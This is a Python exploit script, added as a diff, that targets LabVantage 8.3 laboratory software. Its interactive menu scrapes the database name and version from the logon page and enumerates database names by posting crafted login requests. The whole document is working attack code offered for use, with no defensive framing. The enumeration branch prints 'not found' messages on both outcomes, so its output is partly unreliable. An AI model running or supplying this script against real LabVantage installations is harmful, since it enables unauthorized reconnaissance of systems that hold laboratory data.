@@ -1,0 +1,70 @@
+# Exploit Title: LabVantage 8.3 - Information Disclosure
+# Google Dork: N/A
+# Date: 2020-02-16
+# Exploit Author: Joel Aviad Ossi
+# Vendor Homepage: labvantage.com
+# Software Link: N/A
+# Version: LabVantage 8.3
+# Tested on: *
+# CVE : N/A
+
+
+import requests
+import operator
+
+
+def exploit(target):
+    print("[+] Fetching LabVantage Database Name..")
+    start = "name=\"database\" id=\"database\" value=\""
+    end = "\" >"
+    vstart = "<img src=\"WEB-OPAL/layouts/images/logo_white.png\" title=\""
+    vend = "viewportTest"
+    print("[+] Testing URL: " + target)
+    r = requests.get(target)
+    memory = r.text
+    print("[+] DB: " + memory[memory.find(start) + len(start):memory.rfind(end)])
+    print("[+] VERSION: " + memory[memory.find(vstart) + len(vstart):memory.rfind(vend)][:-71])
+    print("[+] Vulnerable!")
+
+
+def vuln_check():
+    target = input("\nTARGET HOST URL (example: target.com:8080): ")
+    print('[+] Checking if Host is vulnerable.')
+    target = (str(target) + "/labservices/logon.jsp")
+    r = requests.get(target)
+    memory = r.text
+    s = "name=\"database\" id=\"database\" value=\""
+    if not operator.contains(memory, s):
+        print("[-] Not Vulnerable!")
+        exit(0)
+    else:
+        exploit(target)
+
+
+def attack():
+    target = input("\nTARGET HOST URL (example: http://target.com:8080): ")
+    enum = input("\nDB NAME TO CHECK: ")
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
+               'Content-Type': 'application/x-www-form-urlencoded'}
+    payload = ({'nexturl': 'null', 'ignorelogonurl': 'N', 'ignoreexpirywarning': 'false',
+                '_viewport': 'null', 'username': 'null', 'password': 'null',
+                'database': ''+str(enum)+'', 'csrftoken': 'null'})
+    target = (str(target) + "/labservices/rc?command=login")
+    print("[+] Testing URL: " + target)
+    r = requests.post(target, headers=headers, data=payload)
+    memory = r.text
+    start = "Unrecognized"
+    if start in memory:
+        print('[+] DB NOT FOUND!')
+    else:
+        print('[!] NO FOUND!')
+
+
+print("\n1. Vulnerability Check\n2. DB Name Enumeration\n")
+option = input("CHOSE OPTION: ")
+if option == "1":
+    vuln_check()
+elif option == "2":
+    attack()
+else:
+    print("Wrong option selected, try again!")
